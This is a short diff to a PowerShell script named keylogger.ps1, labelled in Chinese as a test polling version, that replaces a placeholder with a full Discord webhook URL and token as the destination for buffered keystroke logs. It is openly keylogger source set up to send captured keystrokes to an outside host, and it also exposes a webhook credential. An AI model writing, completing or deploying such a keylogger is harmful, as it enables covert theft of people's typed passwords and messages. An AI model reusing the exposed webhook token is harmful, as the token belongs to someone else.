@@ -1,5 +1,6 @@
 # 測試用 keylogger.ps1 - 輪詢版本 + 強制測試輸出
-$webhook = "https://discord.com/api/webhooks/您的Webhook網址"
+$webhook = "https://discord.com/api/webhooks/1472107208023081128/RfuzPLMYCYA8XXwTaMQUcWg_VU_TULRl6Lh_sJm1LJW-MyMEDh-ThCZW-_iH-ZD8B77K
+"
 
 $logBuffer = ""
 $lastSend = Get-Date
